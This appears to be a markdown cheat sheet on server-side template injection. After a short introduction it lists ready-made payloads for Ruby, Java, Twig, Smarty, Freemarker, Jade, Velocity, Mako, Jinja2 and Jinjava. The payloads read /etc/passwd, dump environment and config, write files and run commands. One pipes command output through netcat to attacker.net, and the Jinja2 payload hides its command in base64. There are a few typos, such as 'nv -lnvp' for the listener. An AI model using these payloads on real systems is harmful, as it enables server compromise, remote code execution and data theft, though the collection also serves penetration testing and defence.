# Server-Side Template Injection
Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side. This vulnerability occurs when invalid user input is embedded into the template engine which can generally lead to remote code execution (RCE).

Template engines are designed to combine templates with a data model to produce result documents which helps populating dynamic data into web pages. Template engines can be used to display information about users, products etc. 

Some of the most popular template engines can be listed as the followings:

* PHP – Smarty, Twigs
* Java – Velocity, Freemaker
* Python – JINJA, Mako, Tornado
* JavaScript – Jade, Rage
* Ruby – Liquid

When input validation is not properly handled on the server side, a malicious server-side template injection payload can be executed on the server which can result in remote code execution.

# List of different Payloads

## Ruby

### Basic Injection
```<%= 7 * 7 %>```

### Retrieve /etc/passwd
```<%= File.open('/etc/passwd').read %>```

### List of files and directories
```<%= Dir.entries('/') %>```

## Java

### Basic Injection
* `${7*7}`
* `${{7*7}}`
* `${class.getClassLoader()}`
* `${class.getResource("").getPath()}`
* `${class.getResource("../../../../../index.htm").getContent()}`

### Retrieve the system’s environment variables
```${T(java.lang.System).getenv()}```

### Retrieve /etc/passwd
* `${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}`
* `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

## Twig

### Basic Injection
* `{{7*7}}`
* `{{7*'7'}} Would result in 49`

### Code execution
* `{{self}}`
* `{{_self.env.setCache("ftp://attacker.net:2121")}}`
* `{{_self.env.loadTemplate("backdoor")}}`
* `{{_self.env.registerUndefinedFilterCallback("exec")}}`
* `{{_self.env.getFilter("id")}}`

### RCE PAYLOAD - TWIG:
`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

## Smarty
```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"",self::clearConfig())}
```

## Freemarker

### Basic Injection
* `${3*3}`
* `#{3*3}`

### Code execution
* `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
* `[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}`
* `${"freemarker.template.utility.Execute"?new()("id")}`

## Jade/codepen
```
- var x = root.process

- x = x.mainModule.require

- x = x('child_process')

= x.exec('id | nc attacker.net 80')
```

## Velocity
```
#set($str=$class.inspect("java.lang.String").type)

#set($chr=$class.inspect("java.lang.Character").type)

#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()

#set($out=$ex.getInputStream())

#foreach($i in [1..$out.available()])

$str.valueOf($chr.toChars($out.read()))

#end
```

## Mako
```
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Jinja2

### Basic Injection
```
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777

{{config.items()}}
```

### Dump all used classes
```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

### Dump all config variables
```
{% for key, value in config.iteritems() %}
{{ key|e }}
{{ value|e }}
{% endfor %}
```

### Read Remote file
```
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
```

### Write into remote file
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Remote Code Execution
Listen for Connection
```
nv -lnvp 8000
```

### RCE PAYLOAD - JINJA2:
`{{5096754695}}{{''}}{%+set+d+=+"eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnZFc1aGJXVWdMV0U9JykuZGVjb2RlKCkpLnJlYWQoKQ=='))"+%}{%+for+c+in+[].__class__.__base__.__subclasses__()+%}+{%+if+c.__name__+==+'catch_warnings'+%}
{%+for+b+in+c.__init__.__globals__.values()+%}+{%+if+b.__class__+==+{}.__class__+%}
{%+if+'eval'+in+b.keys()+%}
{{+b['eval'](d)+}}
{%+endif+%}+{%+endif+%}+{%+endfor+%}
{%+endif+%}+{%+endfor+%}{{''}}{{9776394213}}`

Note: Decode decode base64 string to to place system commands

## Automation tool for SSTI exploitation:
[TPLMap](https://github.com/epinna/tplmap)

## Jinjava

### Basic Injection
```
{{'a'.toUpperCase()}} would result in 'A'

{{ request }} would return a request object like com.

[...].context.TemplateContextRequest@23548206
```

### Command execution
```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
